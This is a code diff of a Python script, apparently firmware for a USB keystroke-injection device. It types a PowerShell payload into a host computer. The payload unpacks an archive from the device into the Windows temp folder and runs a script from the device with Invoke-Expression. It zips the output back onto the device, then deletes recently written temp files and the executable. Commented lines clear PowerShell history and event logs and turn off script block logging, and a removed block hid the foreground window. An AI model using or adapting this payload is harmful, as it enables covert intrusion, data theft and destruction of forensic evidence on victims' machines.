@@ -176,25 +176,24 @@ def demos():
 
 
 def main():  
-    # Clear-History; Remove-Item -Force -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; Clear-EventLog -LogName "Windows PowerShell";
+    # Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force; 
+    # #Clear-History; Remove-Item -Force -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; Clear-EventLog -LogName "Windows PowerShell";
     # Add history clearing as required
-    # Delete temp files (not yet included)
     # Make sure Invoke-Expression running the script is the last line
     command = """
-# Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force; 
-try { $env:PSReadLineOptions = $null; } catch { Write-Output "Disable failed" }
+$env:PSReadLineOptions = $null;
 $p="C:/windows/temp"
 $o="$p/sout.txt";
 $dl = ((Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":") -replace "^:$", "F:"
 Expand-Archive -Path "$dl/sd/rg.zip" -DestinationPath "$p" -Force; 
 if (Test-Path $o) { del $o };
-Start-Job -ScriptBlock { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; using System.Threading; public class W { [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); public static void D(int d) { Thread.Sleep(d); ShowWindow(GetForegroundWindow(), 6); } }'; [W]::D(5000); }
 $v = (Get-Content "$dl/sd/demo.ps1") -join "`n";
-Invoke-Expression $v | Out-File -FilePath $o -Force 2>$null; while (-not (Test-Path $o)) { Start-Sleep -Milliseconds 500 }; Compress-Archive -Path $o -DestinationPath "$dl/sd/$(Split-Path -Leaf $o)_$(Get-Random).zip"; exit;
+Invoke-Expression $v | Out-File -FilePath $o -Force 2>$null; while (-not (Test-Path $o)) { Start-Sleep -Milliseconds 500 }; Compress-Archive -Path $o -DestinationPath "$dl/sd/$(Split-Path -Leaf $o)_$(Get-Random).zip"; Get-ChildItem -Path "$p" -Recurse | Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-10) } | Remove-Item -Force; Remove-Item -Force "$p/rg.exe"; exit;
 """
     time.sleep(7) 
     run_ps(kbd, layout, command)
 
 main() 
+
 
 
